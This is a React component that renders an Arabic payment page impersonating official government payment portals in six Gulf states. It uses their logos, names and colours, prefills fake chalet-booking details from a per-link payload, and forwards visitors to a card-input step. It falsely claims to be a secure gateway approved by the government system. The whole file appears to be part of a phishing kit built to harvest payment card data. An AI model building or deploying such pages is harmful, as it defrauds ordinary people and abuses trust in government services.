import { useParams, useNavigate } from "react-router-dom";
import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";

const ChaletPaymentGov = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  
  const [billNumber, setBillNumber] = useState("");
  const [paymentType, setPaymentType] = useState("");
  const [amount, setAmount] = useState("");

  const countryCode = linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  const govSystem = getGovernmentPaymentSystem(countryCode);
  const currencyInfo = getCurrencyByCountry(countryCode);

  useEffect(() => {
    if (linkData?.payload) {
      const payload = linkData.payload as any;
      setBillNumber(payload.chalet_id || "");
      setAmount(String(payload.total_amount || payload.price_per_night || ""));
    }
  }, [linkData]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    navigate(`/pay/${id}/card-input`);
  };

  const paymentTypes = {
    SA: [
      "مدفوعات حكومية",
      "حجوزات الشاليهات",
      "حجوزات الفنادق",
      "مدفوعات السياحة",
      "رسوم الإقامة",
      "مدفوعات أخرى"
    ],
    AE: [
      "مدفوعات حكومية",
      "حجوزات ديوان ملكي",
      "حجوزات السياحة",
      "مدفوعات الشاليهات",
      "مدفوعات الفنادق",
      "رسوم الإقامة",
      "مدفوعات أخرى"
    ],
    KW: [
      "مدفوعات حكومية",
      "حجوزات السياحة",
      "حجوزات الشاليهات",
      "مدفوعات الفنادق",
      "رسوم الإقامة",
      "مدفوعات أخرى"
    ],
    QA: [
      "مدفوعات حكومية",
      "حجوزات السياحة",
      "مدفوعات الشاليهات",
      "مدفوعات الفنادق",
      "رسوم الإقامة",
      "مدفوعات أخرى"
    ],
    BH: [
      "مدفوعات حكومية",
      "حجوزات السياحة",
      "مدفوعات الشاليهات",
      "مدفوعات الفنادق",
      "رسوم الإقامة",
      "مدفوعات أخرى"
    ],
    OM: [
      "مدفوعات حكومية",
      "حجوزات السياحة",
      "مدفوعات الشاليهات",
      "مدفوعات الفنادق",
      "رسوم الإقامة",
      "مدفوعات أخرى"
    ]
  };

  const currentPaymentTypes = paymentTypes[countryCode as keyof typeof paymentTypes] || paymentTypes.SA;

  return (
    <div style={{ 
      minHeight: "100vh", 
      background: "#ffffff",
      fontFamily: "'Cairo', 'Arial', sans-serif"
    }}>
      <style>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
      `}</style>

      <header style={{
        background: "#ffffff",
        padding: "12px 20px",
        boxShadow: "0 2px 10px rgba(0, 0, 0, 0.08)",
        borderBottom: `3px solid ${govSystem.colors.primary}`
      }}>
        <div style={{ 
          maxWidth: "1200px", 
          margin: "0 auto",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center"
        }}>
          <div style={{ textAlign: "right" }}>
            {govSystem.logo && (
              <img 
                src={govSystem.logo} 
                alt={govSystem.nameAr}
                style={{ 
                  height: "60px",
                  objectFit: "contain"
                }}
              />
            )}
          </div>
        </div>
      </header>

      <div style={{
        maxWidth: "800px",
        margin: "20px auto",
        padding: "0 15px"
      }}>
        <div style={{
          color: govSystem.colors.primary,
          padding: "12px",
          marginBottom: "15px",
          fontSize: "14px",
          textAlign: "right",
          direction: "rtl"
        }}>
          الرئيسية / شخصي
        </div>

        <div style={{
          background: "#ffffff",
          padding: "30px",
          borderRadius: "12px",
          boxShadow: "0 3px 15px rgba(0, 0, 0, 0.05)",
          border: `2px solid ${govSystem.colors.primary}15`
        }}>
          <h1 style={{
            color: govSystem.colors.primary,
            fontSize: "24px",
            marginBottom: "20px",
            textAlign: "center",
            fontWeight: "700",
            direction: "rtl"
          }}>
            إتمام عملية السداد - {govSystem.nameAr}
          </h1>

          <form onSubmit={handleSubmit} style={{ direction: "rtl" }}>
            <div style={{ marginBottom: "20px" }}>
              <label style={{
                display: "block",
                color: "#5c5c5c",
                fontSize: "14px",
                marginBottom: "8px",
                fontWeight: "600"
              }}>
                أدخل رقم الحجز
              </label>
              <input
                type="text"
                value={billNumber}
                onChange={(e) => setBillNumber(e.target.value)}
                required
                style={{
                  width: "100%",
                  padding: "12px",
                  border: `1px solid ${govSystem.colors.primary}`,
                  borderRadius: "6px",
                  background: `${govSystem.colors.primary}05`,
                  fontSize: "14px",
                  direction: "rtl"
                }}
              />
            </div>

            <div style={{ marginBottom: "20px" }}>
              <label style={{
                display: "block",
                color: "#5c5c5c",
                fontSize: "14px",
                marginBottom: "8px",
                fontWeight: "600"
              }}>
                اختر نوع السداد
              </label>
              <select
                value={paymentType}
                onChange={(e) => setPaymentType(e.target.value)}
                required
                style={{
                  width: "100%",
                  padding: "12px",
                  border: `1px solid ${govSystem.colors.primary}`,
                  borderRadius: "6px",
                  background: `${govSystem.colors.primary}05`,
                  fontSize: "14px",
                  direction: "rtl"
                }}
              >
                <option value="">اختر نوع السداد</option>
                {currentPaymentTypes.map((type, index) => (
                  <option key={index} value={type}>{type}</option>
                ))}
              </select>
            </div>

            <div style={{ marginBottom: "20px" }}>
              <label style={{
                display: "block",
                color: "#5c5c5c",
                fontSize: "14px",
                marginBottom: "8px",
                fontWeight: "600"
              }}>
                قيمة رسوم السداد ({currencyInfo.nameAr})
              </label>
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                required
                style={{
                  width: "100%",
                  padding: "12px",
                  border: `1px solid ${govSystem.colors.primary}`,
                  borderRadius: "6px",
                  background: `${govSystem.colors.primary}05`,
                  fontSize: "14px",
                  direction: "rtl"
                }}
              />
            </div>

            {linkData?.payload && (
              <div style={{
                background: `${govSystem.colors.primary}10`,
                padding: "15px",
                borderRadius: "8px",
                marginBottom: "20px",
                border: `1px solid ${govSystem.colors.primary}30`
              }}>
                <div style={{ 
                  display: "flex", 
                  justifyContent: "space-between", 
                  marginBottom: "8px",
                  fontSize: "13px",
                  color: "#5c5c5c"
                }}>
                  <span style={{ fontWeight: "600" }}>
                    {(linkData.payload as any).chalet_name}
                  </span>
                  <span>اسم الشاليه:</span>
                </div>
                {(linkData.payload as any).nights && (
                  <div style={{ 
                    display: "flex", 
                    justifyContent: "space-between", 
                    marginBottom: "8px",
                    fontSize: "13px",
                    color: "#5c5c5c"
                  }}>
                    <span style={{ fontWeight: "600" }}>
                      {(linkData.payload as any).nights} ليلة
                    </span>
                    <span>المدة:</span>
                  </div>
                )}
                {(linkData.payload as any).guest_count && (
                  <div style={{ 
                    display: "flex", 
                    justifyContent: "space-between",
                    fontSize: "13px",
                    color: "#5c5c5c"
                  }}>
                    <span style={{ fontWeight: "600" }}>
                      {(linkData.payload as any).guest_count} ضيف
                    </span>
                    <span>عدد الضيوف:</span>
                  </div>
                )}
              </div>
            )}

            <button
              type="submit"
              style={{
                background: govSystem.colors.primary,
                color: "white",
                padding: "14px 35px",
                borderRadius: "6px",
                border: "none",
                cursor: "pointer",
                width: "100%",
                fontSize: "16px",
                fontWeight: "600",
                transition: "all 0.3s ease",
                boxShadow: "0 4px 10px rgba(0, 0, 0, 0.1)"
              }}
              onMouseOver={(e) => {
                e.currentTarget.style.background = govSystem.colors.secondary;
                e.currentTarget.style.transform = "translateY(-2px)";
                e.currentTarget.style.boxShadow = "0 6px 15px rgba(0, 0, 0, 0.15)";
              }}
              onMouseOut={(e) => {
                e.currentTarget.style.background = govSystem.colors.primary;
                e.currentTarget.style.transform = "translateY(0)";
                e.currentTarget.style.boxShadow = "0 4px 10px rgba(0, 0, 0, 0.1)";
              }}
            >
              المتابعة والإكمال
            </button>
          </form>

          <div style={{
            marginTop: "25px",
            padding: "15px",
            background: `${govSystem.colors.primary}08`,
            borderRadius: "8px",
            textAlign: "center",
            fontSize: "12px",
            color: "#666",
            direction: "rtl"
          }}>
            <p style={{ marginBottom: "5px" }}>
              🔒 هذه بوابة دفع آمنة ومعتمدة من {govSystem.nameAr}
            </p>
            <p>
              جميع المعاملات محمية بتشفير SSL 256-bit
            </p>
          </div>
        </div>

        <div style={{
          marginTop: "20px",
          textAlign: "center",
          fontSize: "12px",
          color: "#999",
          direction: "rtl"
        }}>
          <p>© 2025 {govSystem.nameAr} - {countryData?.nameAr}</p>
          <p style={{ marginTop: "5px" }}>جميع الحقوق محفوظة</p>
        </div>
      </div>
    </div>
  );
};

export default ChaletPaymentGov;
